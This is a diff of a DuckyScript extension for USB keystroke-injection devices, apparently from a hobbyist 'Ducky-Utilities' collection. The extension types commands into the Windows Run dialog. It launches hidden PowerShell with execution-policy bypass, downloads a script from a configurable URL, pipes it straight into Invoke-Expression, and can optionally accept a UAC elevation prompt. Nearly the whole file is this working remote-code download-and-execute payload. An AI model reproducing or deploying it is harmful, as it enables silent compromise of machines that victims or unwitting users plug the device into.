@@ -1,36 +1,31 @@
 EXTENSION RUN_HOSTED_POWERSHELL
-	REM Title: Run Hosted PowerShell
-	REM Author: Who-Is-Julien
-	REM Description: [/!\ TODO /!\]
-	REM Target: Windows 10, 11
-    REM Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Extensions/Run_Hosted_PowerShell/README.md
+	REM_BLOCK INFOS
+		Title: Run Hosted PowerShell
+		Author: Who-Is-Julien
+		Description: **TODO**
+		Target: Windows 10, 11
+    	Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Extensions/Run_Hosted_PowerShell/README.md
+    END_REM
 
-    REM Basic options:
-    REM [/!\ TODO /!\]
+    REM Required options:
 	DEFINE SCRIPT_URL example.com
 
     REM Advanced options:
-	REM Short delay time
 	DEFINE SHORT_DELAY 500
-	REM Medium delay time
 	DEFINE MEDIUM_DELAY 2000
-	REM [/!\ TODO /!\]
 	DEFINE ELEVATED_EXECUTION FALSE
 
-	FUNCTION RUN()
+	GUI r
+	DELAY MEDIUM_DELAY
+	STRING PowerShell -W H -EX Bypass "IWR -UseB '
+	STRING SCRIPT_URL
+	STRING ' | IEX"
+	IF ( ELEVATED_EXECUTION == TRUE ) THEN
 		DELAY SHORT_DELAY
-		GUI r
-		DELAY MEDIUM_DELAY
-		STRING PowerShell -W H -EX Bypass "IWR -UseB '
-		STRING SCRIPT_URL
-		STRING ' | IEX"
-		IF ( ELEVATED_EXECUTION == TRUE ) THEN
-			DELAY SHORT_DELAY
-			CTRL SHIFT ENTER
-			DELAY SHORT_DELAY
-			LEFT
-		END_IF
+		CTRL SHIFT ENTER
 		DELAY SHORT_DELAY
-		ENTER
-    END_FUNCTION
+		LEFT
+	END_IF
+	DELAY SHORT_DELAY
+	ENTER
 END_EXTENSION
